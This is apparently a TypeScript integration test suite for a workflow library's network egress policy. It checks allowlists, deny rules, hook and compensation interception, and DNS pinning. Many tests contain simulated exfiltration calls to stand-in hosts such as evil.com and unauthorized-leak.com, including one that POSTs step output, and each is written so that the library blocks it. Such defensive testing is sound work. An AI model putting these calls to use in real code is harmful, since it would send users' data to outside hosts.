import { expect } from 'chai';
import http from 'node:http';
import net from 'node:net';
import {
    Step,
    flow,
    parallel,
    when,
    branch,
    map,
    inspectGraph,
    toGraph,
    NetworkPolicyViolationException,
    CompensationException,
    defaultCompensationManager,
    defaultStorageManager,
    clearStorage,
    networkPolicyStorage,
    uninstallNetworkInterceptors,
    ExecutionPhase,
    isWorkflowSuspended,
} from '../../index';

describe('Network Egress Policy End-to-End Integration Suite', () => {
    let mockLocalServer: http.Server;
    let localPort: number;

    before(done => {
        mockLocalServer = http.createServer((_req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok', service: 'mock-local-api' }));
        });
        mockLocalServer.listen(0, '127.0.0.1', () => {
            const addr = mockLocalServer.address() as any;
            localPort = addr.port;
            done();
        });
    });

    afterEach(() => {
        clearStorage();
        defaultCompensationManager.clear();
    });

    after(done => {
        uninstallNetworkInterceptors();
        mockLocalServer.close(done);
    });

    describe('Step-Level Declarative API', () => {
        it('allows whitelisted domains with .allowNetwork() and blocks unauthorized hosts', async () => {
            const allowedHost = 'api.stripe.com';
            const blockedHost = 'api.github.com';

            const step = Step.create('paymentStep', async (param: { target: string }) => {
                return await fetch(param.target);
            }).allowNetwork([allowedHost]);

            expect(step.networkPolicy()).to.not.be.undefined;
            expect(step.networkPolicy()!.allowedHosts).to.deep.equal([allowedHost]);

            // Attempt unauthorized host
            try {
                await step.execute({ target: `https://${blockedHost}/v1/users` });
                expect.fail('Should have failed unauthorized network egress');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('paymentStep');
                expect(err.requestedHost).to.equal(blockedHost);
                expect(err.allowedHosts).to.deep.equal([allowedHost]);
                expect(err.retryable).to.be.false;
            }
        });

        it('strictly disallows all external network calls with .denyNetwork()', async () => {
            const computeStep = Step.create('calculateDiscounts', async () => {
                await fetch('https://api.stripe.com/charges');
                return { total: 100 };
            }).denyNetwork();

            expect(computeStep.networkPolicy()!.allowedHosts).to.deep.equal([]);

            try {
                await computeStep.execute();
                expect.fail('Should have blocked network call');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('calculateDiscounts');
                expect(err.allowedHosts).to.deep.equal([]);
            }
        });

        it('configures custom network policy with .networkPolicy()', async () => {
            const syncStep = Step.create('syncProfile', async (param: { url: string }) => {
                return await fetch(param.url);
            }).networkPolicy({
                allowedHosts: ['api.github.com'],
                allowLocalhost: true,
            });

            expect(syncStep.networkPolicy()!.allowedHosts).to.deep.equal(['api.github.com']);

            try {
                await syncStep.execute({ url: 'https://evil.com/leak' });
                expect.fail('Should have failed');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }
        });

        it('enforces network policy during Step reduce execution', async () => {
            const batchStep = Step.create('batchProcessor', async (item: string) => {
                await fetch('https://external-leak.com/batch');
                return item.toUpperCase();
            })
                .reduce('items')
                .denyNetwork();

            try {
                await batchStep.execute({ items: ['item1', 'item2'] });
                expect.fail('Should have blocked batch reduce network call');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('batchProcessor');
            }
        });
    });

    describe('Flow-Level Declarative API and Precedence Rules', () => {
        it('enforces Flow as outer envelope: step cannot unilaterally expand perimeter', async () => {
            const rogueStep = Step.create('rogueStep', async () => {
                await fetch('https://api.unauthorized-service.com/data');
                return { done: true };
            }).allowNetwork(['api.unauthorized-service.com']); // Attempting to allow domain outside flow

            const safeWorkflow = flow(rogueStep).networkPolicy({
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com'], // Flow only allows stripe.com
            });

            try {
                await safeWorkflow.run({});
                expect.fail('Flow perimeter should have superseded step allowance');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('rogueStep');
                expect(err.requestedHost).to.equal('api.unauthorized-service.com');
            }
        });

        it('allows step to narrow flow allowlist to a strict subset', async () => {
            const narrowedStep = Step.create('narrowedStep', async () => {
                await fetch('https://api.sendgrid.com/v3/mail/send');
                return { done: true };
            }).allowNetwork(['api.stripe.com', '127.0.0.1']); // Narrowed only to Stripe, sendgrid is excluded

            const multiServiceWorkflow = flow(narrowedStep).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
            });

            try {
                await multiServiceWorkflow.run({});
                expect.fail('Narrowed step perimeter should have blocked sendgrid');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('narrowedStep');
                expect(err.requestedHost).to.equal('api.sendgrid.com');
            }
        });

        it('supports dynamic per-execution run options network policy override', async () => {
            const dynamicStep = Step.create('dynamicStep', async () => {
                await fetch('https://api.sendgrid.com/v3/mail/send');
                return { done: true };
            });

            const workflow = flow(dynamicStep).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
            });

            // Per-execution override removes sendgrid from perimeter
            try {
                await workflow.run(
                    {},
                    {
                        networkPolicy: {
                            allowedHosts: ['api.stripe.com'],
                        },
                    },
                );
                expect.fail('Per-execution run policy should have blocked sendgrid');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('dynamicStep');
                expect(err.requestedHost).to.equal('api.sendgrid.com');
            }
        });
    });

    describe('Localhost Exemption and Real HTTP Server Verification', () => {
        it('allows loopback requests when allowLocalhost: true is configured against a real local HTTP server', async () => {
            const localCallStep = Step.create('localStep', async () => {
                const res = await fetch(`http://127.0.0.1:${localPort}/`);
                const data = await res.json();
                return { data };
            }).networkPolicy({ allowedHosts: [], allowLocalhost: true });

            const result: any = await localCallStep.execute();
            expect(result.data).to.deep.equal({ status: 'ok', service: 'mock-local-api' });
        });

        it('blocks loopback requests by default when denyNetwork() is configured', async () => {
            const strictStep = Step.create('strictStep', async () => {
                await fetch(`http://127.0.0.1:${localPort}/`);
                return { ok: true };
            }).denyNetwork();

            try {
                await strictStep.execute();
                expect.fail('Should have blocked localhost when allowLocalhost: false');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('strictStep');
                expect(err.requestedHost).to.include('127.0.0.1');
            }
        });
    });

    describe('Concurrency and AsyncLocalStorage Isolation', () => {
        it('isolates concurrent parallel steps without cross-talk on the single event loop', async () => {
            let allowedExecuted = false;

            const allowedStep = Step.create('allowedStep', async () => {
                // Simulating async delay
                await new Promise(r => setTimeout(r, 20));
                // Local server call is allowed
                const res = await fetch(`http://127.0.0.1:${localPort}/`);
                const json = await res.json();
                allowedExecuted = true;
                return { allowed: json.status };
            }).networkPolicy({ allowedHosts: ['api.stripe.com'], allowLocalhost: true });

            const blockedStep = Step.create('blockedStep', async () => {
                await new Promise(r => setTimeout(r, 10));
                // Call unauthorized external host
                await fetch('https://evil-cross-talk.org/leak');
                return { blocked: false };
            }).denyNetwork();

            const parallelWorkflow = flow(parallel(allowedStep, blockedStep, { mode: 'allSettled' }));

            const result: any = await parallelWorkflow.run();

            expect(allowedExecuted).to.be.true;
            expect(result.$settled[0].status).to.equal('fulfilled');
            expect(result.$settled[0].value).to.deep.equal({ allowed: 'ok' });

            expect(result.$settled[1].status).to.equal('rejected');
            const error = result.$settled[1].reason;
            expect(error).to.be.instanceOf(NetworkPolicyViolationException);
            expect(error.stepName).to.equal('blockedStep');
            expect(error.requestedHost).to.equal('evil-cross-talk.org');
        });
    });

    describe('Step Lifecycle Hooks Network Governance', () => {
        it('intercepts and blocks unauthorized network egress inside onBefore hook', async () => {
            const stepWithBeforeLeak = Step.create('beforeLeakStep', () => ({ ok: true }))
                .denyNetwork()
                .onBefore(async () => {
                    await fetch('https://unauthorized-leak.com/pre-check');
                    return true;
                });

            try {
                await stepWithBeforeLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onBefore');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('beforeLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
                expect(err.phase).to.equal('before');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onSkip hook', async () => {
            const stepWithSkipLeak = Step.create('skipLeakStep', () => ({ ok: true }))
                .denyNetwork()
                .onBefore(() => false)
                .onSkip(async () => {
                    await fetch('https://unauthorized-leak.com/skip-fallback');
                    return { skipped: true };
                });

            try {
                await stepWithSkipLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onSkip');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('skipLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onAfter hook', async () => {
            const stepWithAfterLeak = Step.create('afterLeakStep', () => ({ computed: 42 }))
                .denyNetwork()
                .onAfter(async output => {
                    await fetch('https://unauthorized-leak.com/enrich', {
                        method: 'POST',
                        body: JSON.stringify(output),
                    });
                    return output;
                });

            try {
                await stepWithAfterLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onAfter');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('afterLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
                expect(err.phase).to.equal('after');
            }
        });

        it('intercepts and blocks unauthorized network egress inside onFail hook', async () => {
            const stepWithFailLeak = Step.create('failLeakStep', () => {
                throw new Error('Action failed');
            })
                .denyNetwork()
                .onFail(async (_err, retry) => {
                    await fetch('https://unauthorized-leak.com/fail-webhook');
                    retry({ recovered: true });
                });

            try {
                await stepWithFailLeak.execute();
                expect.fail('Should have intercepted unauthorized egress in onFail');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('failLeakStep');
                expect(err.requestedHost).to.equal('unauthorized-leak.com');
            }
        });

        it('allows permitted network calls across onBefore and onAfter hooks', async () => {
            const permittedStep = Step.create('permittedLifecycleStep', () => ({ processed: true }))
                .allowNetwork(['127.0.0.1'])
                .onBefore(async () => {
                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
                    const data = await res.json();
                    return data.status === 'ok';
                })
                .onAfter(async output => {
                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
                    const data = await res.json();
                    return { ...output, service: data.service };
                });

            const result: any = await permittedStep.execute();
            expect(result.processed).to.be.true;
            expect(result.service).to.equal('mock-local-api');
        });
    });

    describe('Graph Inspection Integration', () => {
        it('includes step and flow networkPolicy in toGraph and inspectGraph', () => {
            const stepA = Step.create('stepA', () => ({})).allowNetwork(['api.stripe.com']);
            const stepB = Step.create('stepB', () => ({})).denyNetwork();

            const workflow = flow(stepA, stepB).networkPolicy({
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
                allowLocalhost: true,
            });

            const graphNode = toGraph(workflow);
            expect(graphNode.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
                allowLocalhost: true,
            });

            const inspected = inspectGraph(workflow);
            const nodeA = inspected.nodes.find(n => n.name === 'stepA');
            const nodeB = inspected.nodes.find(n => n.name === 'stepB');

            expect(nodeA?.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: ['api.stripe.com'],
                allowLocalhost: false,
            });

            expect(nodeB?.metadata?.networkPolicy).to.deep.equal({
                enabled: true,
                defaultPolicy: 'deny',
                allowedHosts: [],
                allowLocalhost: false,
            });
        });
    });

    describe('Step.spec Network Policy Enforcement & Validation Phase Tagging', () => {
        it('intercepts and blocks unauthorized network egress inside spec validator and tags with validation phase', async () => {
            const step = Step.create('validateStep', async (param: any) => param)
                .spec('field', {
                    validate: async () => {
                        await fetch('https://unauthorized.com/val');
                        return true;
                    },
                })
                .allowNetwork(['api.stripe.com']);

            try {
                await step.execute({ field: 'test' });
                expect.fail('Should have failed unauthorized network egress in spec validator');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
                expect(err.stepName).to.equal('validateStep');
                expect(err.requestedHost).to.equal('unauthorized.com');
            }
        });

        it('intercepts and blocks unauthorized network egress inside spec transformer and tags with validation phase', async () => {
            const step = Step.create('transformStep', async (param: any) => param)
                .spec('field', {
                    transform: async (val: string) => {
                        await fetch('https://unauthorized.com/trans');
                        return val.toUpperCase();
                    },
                })
                .allowNetwork(['api.stripe.com']);

            try {
                await step.execute({ field: 'test' });
                expect.fail('Should have failed unauthorized network egress in spec transformer');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
                expect(err.stepName).to.equal('transformStep');
                expect(err.requestedHost).to.equal('unauthorized.com');
            }
        });

        it('intercepts and blocks unauthorized network egress inside spec translator and tags with validation phase', async () => {
            const step = Step.create('translateStep', async (param: any) => param)
                .spec('field', {
                    translate: async (val: string) => {
                        await fetch('https://unauthorized.com/trans');
                        return val.toLowerCase();
                    },
                })
                .allowNetwork(['api.stripe.com']);

            try {
                await step.execute({ field: 'TEST' });
                expect.fail('Should have failed unauthorized network egress in spec translator');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
                expect(err.stepName).to.equal('translateStep');
                expect(err.requestedHost).to.equal('unauthorized.com');
            }
        });

        it('allows permitted network calls inside spec validator when host is whitelisted', async () => {
            const permittedStep = Step.create('permittedSpecStep', (param: any) => ({ ...param, processed: true }))
                .spec('field', {
                    validate: async () => {
                        const res = await fetch(`http://127.0.0.1:${localPort}/`);
                        const data = await res.json();
                        return data.status === 'ok';
                    },
                })
                .networkPolicy({ allowLocalhost: true });

            const result: any = await permittedStep.execute({ field: 'hello' });
            expect(result.processed).to.be.true;
            expect(result.field).to.equal('hello');
        });

        it('enforces flow-level network policy within Step.spec', async () => {
            const step = Step.create('flowScopedSpecStep', async (param: any) => param).spec('field', {
                validate: async () => {
                    await fetch('https://evil.com/check');
                    return true;
                },
            });

            const workflow = flow(step).networkPolicy({
                allowedHosts: ['api.stripe.com'],
            });

            try {
                await workflow.run({ field: 'data' });
                expect.fail('Should have failed flow-level network egress check in spec');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
                expect(err.stepName).to.equal('flowScopedSpecStep');
                expect(err.requestedHost).to.equal('evil.com');
            }
        });
    });

    describe('Enclosing Combinators, Nested Sub-Flows, and Saga Compensation ASL Governance', () => {
        it('prevents steps and nested sub-flows inside parallel, when, branch, map, and Step.create(subFlow) from widening outer flow perimeter', async () => {
            // 1. parallel with rogue step + rogue sub-flow
            const rogueParStep = Step.create('rogueParStep', async () => {
                await fetch('https://evil.com/par');
                return { ok: true };
            }).allowNetwork(['evil.com']);

            const subFlowAttempt = flow(
                Step.create('subStep', async () => {
                    await fetch('https://evil.com/subflow');
                    return { ok: true };
                }),
            ).networkPolicy({ allowedHosts: ['evil.com'] });

            const outerParFlow = flow(parallel(rogueParStep, subFlowAttempt, { mode: 'allSettled' })).networkPolicy({
                allowedHosts: ['api.stripe.com'],
            });

            const parRes: any = await outerParFlow.run({});
            expect(parRes.$settled[0].status).to.equal('rejected');
            expect(parRes.$settled[0].reason).to.be.instanceOf(NetworkPolicyViolationException);
            expect(parRes.$settled[0].reason.requestedHost).to.equal('evil.com');
            expect(parRes.$settled[1].status).to.equal('rejected');
            expect(parRes.$settled[1].reason).to.be.instanceOf(NetworkPolicyViolationException);
            expect(parRes.$settled[1].reason.requestedHost).to.equal('evil.com');

            // 2. when combinator
            const rogueWhenStep = Step.create('rogueWhenStep', async () => {
                await fetch('https://evil.com/when');
                return { ok: true };
            }).allowNetwork(['evil.com']);

            try {
                await flow(when(() => true, rogueWhenStep))
                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
                    .run({});
                expect.fail('when branch should not widen outer flow policy');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }

            // 3. branch combinator
            const rogueBranchStep = Step.create('rogueBranchStep', async () => {
                await fetch('https://evil.com/branch');
                return { ok: true };
            }).allowNetwork(['evil.com']);

            try {
                await flow(branch(() => 'target', { target: rogueBranchStep }))
                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
                    .run({});
                expect.fail('branch target should not widen outer flow policy');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }

            // 4. map combinator
            const rogueMapStep = Step.create('rogueMapStep', async () => {
                await fetch('https://evil.com/map');
                return { ok: true };
            }).allowNetwork(['evil.com']);

            try {
                await flow(map([1], rogueMapStep))
                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
                    .run({});
                expect.fail('map item step should not widen outer flow policy');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }

            // 5. Step.create(subFlow) cannot widen outer policy, while permitted narrowing works
            const wrappedWiderSubFlow = Step.create(
                flow(
                    Step.create('wrappedSubStep', async () => {
                        await fetch('https://evil.com/wrapped');
                        return { ok: true };
                    }),
                ).networkPolicy({ allowedHosts: ['evil.com'] }),
            );

            try {
                await flow(wrappedWiderSubFlow)
                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
                    .run({});
                expect.fail('Step.create(subFlow) should not widen outer flow policy');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.requestedHost).to.equal('evil.com');
            }

            const permittedNarrowedSubFlow = Step.create(
                flow(
                    Step.create('permittedSubStep', async () => {
                        const res = await fetch(`http://127.0.0.1:${localPort}/`);
                        return await res.json();
                    }),
                ).networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true }),
            );

            const narrowedOk: any = await flow(permittedNarrowedSubFlow)
                .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`, 'api.stripe.com'], allowLocalhost: true })
                .run({}, { pojo: true });
            expect(narrowedOk.status).to.equal('ok');
        });

        it('enforces networkPolicyConfig when chain carries networkPolicy as a method/function property', async () => {
            const chainWithFnPolicy: any = {
                name: 'chainWithFnPolicy',
                specs: [],
                onbefore: () => true,
                networkPolicy: () => ({
                    enabled: true,
                    defaultPolicy: 'deny',
                    allowedHosts: ['api.stripe.com'],
                    allowLocalhost: false,
                }),
                networkPolicyConfig: {
                    enabled: true,
                    defaultPolicy: 'deny',
                    allowedHosts: ['api.stripe.com'],
                    allowLocalhost: false,
                },
                action: async () => {
                    await fetch('https://evil.com/fn-policy');
                    return { ok: true };
                },
            };

            try {
                await Step.start(chainWithFnPolicy);
                expect.fail('Chain with function networkPolicy should use networkPolicyConfig');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('chainWithFnPolicy');
                expect(err.requestedHost).to.equal('evil.com');
            }
        });

        it('enforces captured effective networkPolicy during automatic Saga rollback compensations', async () => {
            // Disallowed egress inside function compensation handler
            const stepWithBlockedComp = Step.create('debitAccount', () => ({ tx: 'tx_1' }))
                .allowNetwork(['api.stripe.com'])
                .compensate(async () => {
                    await fetch('https://evil.com/refund-leak');
                });

            const failingStep = Step.create('failAfterDebit', () => {
                throw new Error('Order rejected');
            });

            try {
                await flow(stepWithBlockedComp, failingStep)
                    .networkPolicy({ allowedHosts: ['api.stripe.com', `127.0.0.1:${localPort}`] })
                    .run({});
                expect.fail('Should have failed with CompensationException');
            } catch (err: any) {
                expect(err).to.be.instanceOf(CompensationException);
                expect(err.compensationErrors).to.have.length(1);
                expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
            }

            // Permitted egress inside compensation handler (both function and Step handler)
            let funcCompStatus = '';
            let stepCompStatus = '';

            const stepFuncComp = Step.create('stepFuncComp', () => ({ ok: true }))
                .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true })
                .compensate(async () => {
                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
                    const json: any = await res.json();
                    funcCompStatus = json.status;
                });

            const undoStep = Step.create('undoStepHandler', async () => {
                const res = await fetch(`http://127.0.0.1:${localPort}/`);
                const json: any = await res.json();
                stepCompStatus = json.status;
            });

            const stepCompWithStep = Step.create('stepCompWithStep', () => ({ ok: true })).compensate(undoStep);

            try {
                await flow(stepFuncComp, stepCompWithStep, failingStep)
                    .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true })
                    .run({});
                expect.fail('Should throw original Error after compensations succeed');
            } catch (err: any) {
                expect(err.message).to.equal('Order rejected');
                expect(funcCompStatus).to.equal('ok');
                expect(stepCompStatus).to.equal('ok');
            }
        });

        it('enforces captured & intersected networkPolicy across checkpoint-hydrated flow.compensate() and enclosing ALS scope', async () => {
            const stepWithPolicy = Step.create('reserveFlight', () => ({ resId: 'fl-1' }))
                .allowNetwork(['api.stripe.com'])
                .compensate(async () => {
                    await fetch('https://evil.com/cancel-flight');
                });

            const suspendStep = Step.create('waitConfirm', () => {
                const err: any = new Error('Suspended');
                err.name = 'WorkflowSuspendedException';
                err.correlationKey = 'corr-comp-asl';
                throw err;
            });

            const f = flow(stepWithPolicy, suspendStep).networkPolicy({
                allowedHosts: ['api.stripe.com'],
            });

            const suspension = await f.run({}, { durable: true });
            if (!isWorkflowSuspended(suspension)) expect.fail('Expected workflow suspension');
            const stackId = suspension.stackId;

            const cp = await defaultStorageManager.getCheckpoint(stackId);
            expect(cp?.metadata?.compensations?.[0]?.networkPolicy?.enabled).to.be.true;
            expect(cp?.metadata?.compensations?.[0]?.networkPolicy?.allowedHosts).to.deep.equal(['api.stripe.com']);

            // Simulate node restart so flow.compensate() hydrates from checkpoint
            defaultCompensationManager.clear();

            try {
                await f.compensate(stackId, {
                    networkPolicy: { allowedHosts: ['evil.com'] }, // Cannot widen flow's policy
                });
                expect.fail('Should block unauthorized host in hydrated compensation');
            } catch (err: any) {
                expect(err).to.be.instanceOf(CompensationException);
                expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
            }

            // Enclosing ASL networkPolicyStorage intersecting with options.networkPolicy
            const manualStack = 'manual-asl-intersect';
            defaultCompensationManager.registerCompensation(manualStack, {
                stepId: 's-manual',
                stepName: 'manualAslStep',
                output: {},
                input: {},
                handler: async () => {
                    await fetch('https://evil.com/manual');
                },
            });

            await networkPolicyStorage.run(
                {
                    enabled: true,
                    defaultPolicy: 'deny',
                    allowedHosts: ['api.stripe.com'],
                    allowLocalhost: false,
                    stepName: 'manual-asl',
                },
                async () => {
                    try {
                        await defaultCompensationManager.runCompensations(manualStack, undefined, {
                            networkPolicy: { allowedHosts: ['evil.com'] },
                        });
                        expect.fail('Should block widened options.networkPolicy when enclosing ASL is active');
                    } catch (err: any) {
                        expect(err).to.be.instanceOf(CompensationException);
                        expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
                        expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
                    }

                    // Also verify enclosing ASL is enforced directly when options.networkPolicy is omitted
                    defaultCompensationManager.clearCompensations(manualStack);
                    defaultCompensationManager.registerCompensation(manualStack, {
                        stepId: 's-manual-2',
                        stepName: 'manualAslNoOpts',
                        output: {},
                        input: {},
                        handler: async () => {
                            await fetch('https://evil.com/manual-no-opts');
                        },
                    });
                    try {
                        await defaultCompensationManager.runCompensations(manualStack);
                        expect.fail('Should enforce enclosing ASL policy when options omitted');
                    } catch (err: any) {
                        expect(err).to.be.instanceOf(CompensationException);
                        expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
                        expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
                    }
                },
            );
        });
    });

    describe('Step.compute Always-Deny Network Perimeter', () => {
        it('blocks fetch(), http.get(), and net.connect() even when parent flow has no networkPolicy', async () => {
            const fetchCompute = Step.compute('computeFetch', () => {
                fetch('https://api.stripe.com/v1/charges');
                return { ok: true };
            });

            try {
                await flow(fetchCompute).run({});
                expect.fail('Should have blocked fetch in Step.compute');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('computeFetch');
                expect(err.requestedHost).to.equal('api.stripe.com');
                expect(err.allowedHosts).to.deep.equal([]);
                expect(err.retryable).to.be.false;
            }

            const httpCompute = Step.compute('computeHttp', () => {
                http.get(`http://127.0.0.1:${localPort}/health`);
                return { ok: true };
            });

            try {
                await httpCompute.run({});
                expect.fail('Should have blocked http.get in Step.compute');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('computeHttp');
            }

            const netCompute = Step.compute('computeNet', () => {
                net.connect({ host: '127.0.0.1', port: localPort });
                return { ok: true };
            });

            try {
                await netCompute.run({});
                expect.fail('Should have blocked net.connect in Step.compute');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('computeNet');
            }
        });

        it('denies network egress inside Step.compute even when parent flow explicitly allows localhost and all hosts', async () => {
            const fetchLocal = Step.create('fetchLocal', async () => {
                const res = await fetch(`http://127.0.0.1:${localPort}/ok`);
                return await res.json();
            });
            const sneakyCompute = Step.compute('sneakyCompute', () => {
                http.get(`http://127.0.0.1:${localPort}/leak`);
                return { leaked: true };
            });

            const permissiveFlow = flow(fetchLocal, sneakyCompute).networkPolicy({
                enabled: true,
                defaultPolicy: 'allow',
                allowedHosts: ['*'],
                allowLocalhost: true,
            });

            try {
                await permissiveFlow.run({});
                expect.fail('Step.compute must override permissive parent flow policy');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('sneakyCompute');
                expect(err.allowedHosts).to.deep.equal([]);
            }
        });

        it('enforces always-deny network perimeter during .spec() validation, transform, translate, schema, and cache keySerializer', async () => {
            const specNetworkStep = Step.compute('specNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
                validate: () => {
                    http.get(`http://127.0.0.1:${localPort}/spec-leak`);
                    return true;
                },
            });

            try {
                await specNetworkStep.run({ x: 1 });
                expect.fail('Should have blocked network call inside .spec() validate');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('specNet');
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
            }

            const transformNetStep = Step.compute('transformNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
                transform: (v: number) => {
                    fetch('https://evil.com/spec-transform');
                    return v + 1;
                },
            });

            try {
                await transformNetStep.run({ x: 1 });
                expect.fail('Should have blocked network call inside .spec() transform');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('transformNet');
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
            }

            const translateNetStep = Step.compute('translateNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
                translate: () => {
                    net.connect({ host: '127.0.0.1', port: localPort });
                },
            });

            try {
                await translateNetStep.run({ x: 1 });
                expect.fail('Should have blocked network call inside .spec() translate');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('translateNet');
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
            }

            const schemaNetStep = Step.compute('schemaNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
                parse: (v: number) => {
                    http.get(`http://127.0.0.1:${localPort}/schema-leak`);
                    return v;
                },
            });

            try {
                await schemaNetStep.run({ x: 1 });
                expect.fail('Should have blocked network call inside .spec() schema');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('schemaNet');
                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
            }

            const keyNetworkStep = Step.compute('keyNet', (ctx: { x: number }) => ({ x: ctx.x })).cache({
                keySerializer: () => {
                    http.get(`http://127.0.0.1:${localPort}/key-leak`);
                    return 'k';
                },
            });

            try {
                await keyNetworkStep.run({ x: 1 });
                expect.fail('Should have blocked network call inside keySerializer');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.stepName).to.equal('keyNet');
            }
        });

        it('enforces DNS pinning on 1-arg http.get(url) when allowLocalhost is false', async () => {
            const dnsPinStep = Step.create('dnsPin1ArgHttp', () => {
                return new Promise((resolve, reject) => {
                    const req = http.get(`http://localhost:${localPort}/`);
                    req.on('error', reject);
                    req.on('response', res => {
                        res.resume();
                        resolve({ ok: true });
                    });
                });
            }).networkPolicy({
                allowedHosts: [`localhost:${localPort}`],
                allowLocalhost: false,
            });

            try {
                await dnsPinStep.execute();
                expect.fail('Should have blocked 1-arg http.get resolving localhost to loopback IP');
            } catch (err: any) {
                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
                expect(err.reason || err.message).to.include('restricted IP');
            }
        });
    });
});
